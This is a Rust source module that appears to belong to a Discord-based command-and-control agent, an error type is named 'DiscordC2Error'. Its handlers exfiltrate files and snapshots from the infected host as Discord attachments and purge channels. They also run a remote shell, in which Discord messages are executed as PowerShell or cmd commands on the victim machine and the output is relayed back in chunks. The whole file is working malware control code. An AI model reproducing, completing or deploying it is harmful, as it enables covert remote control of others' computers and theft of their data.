use anyhow::{Error};
use serenity::{
    client::Context,
    model::application::interaction::{InteractionResponseType, application_command::ApplicationCommandInteraction},
};

use crate::commands::sessions::{exit, session};
use crate::ephemeral_interaction_create;
use crate::errors::DiscordC2Error;
use serenity::model::channel::Message;
use lazy_static::lazy_static;
use serenity::model::id::ChannelId;
use tokio::sync::Mutex;
use crate::os::process_handler::{ProcessHandler, ShellType};

lazy_static! {
    static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
}

pub mod exfiltrate;
pub mod info;
pub mod purge;
pub mod sessions;
pub mod snapshot;

pub async fn handle_exfiltrate(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let attachment = exfiltrate::run(&command.data.options).await;

    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    if let Some(att) = attachment {
                        message.content("Successfully exfiltrated!");
                        message.add_file(att);
                    } else {
                        message.content("Failed to exfiltrate :(");
                    }

                    message
                })
        })
        .await?;
    Ok(())
}

pub async fn handle_purge(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), Error> {
    let content = purge::run(&ctx, &command.channel_id).await;
    ephemeral_interaction_create(ctx, command, &content).await?;
    Ok(())
}

pub async fn handle_snapshot(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), Error> {
    let content = snapshot::run(&command.data.options).await;

    match content {
        Ok(content) => {
            match content {
               Some(content) => {
                   command.create_interaction_response(&ctx.http, |response| {
                       response
                           .kind(InteractionResponseType::ChannelMessageWithSource)
                           .interaction_response_data(|message| {
                               message.content("Successfully exfiltrated snapshot:");
                               message.add_file(content);
                               message
                           })
                   })
                       .await?;
               }
                None => {
                    command.create_interaction_response(&ctx.http, |response| {
                        response
                            .kind(InteractionResponseType::ChannelMessageWithSource)
                            .interaction_response_data(|message| {
                                message.content("There was no file available");
                                message
                            })
                    }).await?;
                }
            }

        }

        Err(err) => {
            command.create_interaction_response(&ctx.http, |response| {
                response
                    .kind(InteractionResponseType::ChannelMessageWithSource)
                    .interaction_response_data(|message| {
                        message.content(format!("Ran into an error when performing the snapshot: {}", err));
                        message
                    })
            }).await?;
        }

    }


    Ok(())
}



pub async fn handle_session(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), Error> {
    let (content, shell) = session::run(&ctx, &command.data.options).await?;
    ephemeral_interaction_create(&ctx, command, &content).await?;

    let shell_type = shell.ok_or(DiscordC2Error::AgentError("Shell was not properly created".parse().unwrap()))?;

    // Store shell_type in the global variable
    *SHELL_TYPE.lock().await = Some(shell_type);
    println!("Shell Type in handle_session: {:?}", shell_type);
    Ok(())
}

pub async fn handle_command(ctx: &Context, message: &Message) -> Result<(), Error> {

    let shell_type = match SHELL_TYPE.lock().await.clone().take() {
        Some(shell_type) => shell_type,
        None => {
            // The session was closed/stale
            if !message.author.bot {
                if let Err(why) = message.channel_id.say(&ctx.http, "Stale or expired session. Closing...").await {
                    println!("Error sending message: {:?}", why);
                }
                exit::run(&ctx).await?;
            }
            return Ok(());
        }
    };

    let shell = ProcessHandler::instance(shell_type).await?;

    if !message.author.bot {
        // If the user isn't the bot and wants to exit
        if message.content == "exit" {
            shell.exit().await?;
            let mut shell_type = SHELL_TYPE.lock().await;
            *shell_type = None;

            if let Err(why) = message.channel_id.say(&ctx.http, "Successfully exited session. Use /exit to close the channel.").await {
                println!("Error sending message: {:?}", why);
            }

        } else {
            let output = shell.run_command(&message.content).await?;
            if let Err(why) = send_message(&ctx, message.channel_id, &output, shell.shell_type).await {
                println!("{}", why);
            }
        }
    }

    Ok(())
}

/* Helper function to send long messages in a discord-friendly way */
async fn send_message(ctx: &Context, channel_id: ChannelId, output: &str, shell_type: ShellType) -> Result<(), String> {
    let language = match shell_type {
        ShellType::Powershell => "powershell",
        ShellType::Cmd => "cmd",
    };

    let output_chunks = output.split('\n');
    let fence = format!("```{}\n", language);
    let fence_length = fence.len() + 3; // 3 for the closing fence
    let mut buffer = fence.clone();

    for line in output_chunks {
        if buffer.len() + line.len() + 1 + fence_length > 2000 {
            buffer.push_str("```");
            if let Err(why) = channel_id.say(&ctx.http, &buffer).await {
                println!("Error sending message: {:?}", why);
                return Err(format!("Error sending message: {:?}", why));
            }
            buffer = fence.clone();
        }
        buffer.push_str(line);
        buffer.push('\n');
    }

    if !buffer.is_empty() {
        buffer.push_str("```");
        if let Err(why) = channel_id.say(&ctx.http, &buffer).await {
            println!("Error sending message: {:?}", why);
            return Err(format!("Error sending message: {:?}", why));
        }
    }

    Ok(())
}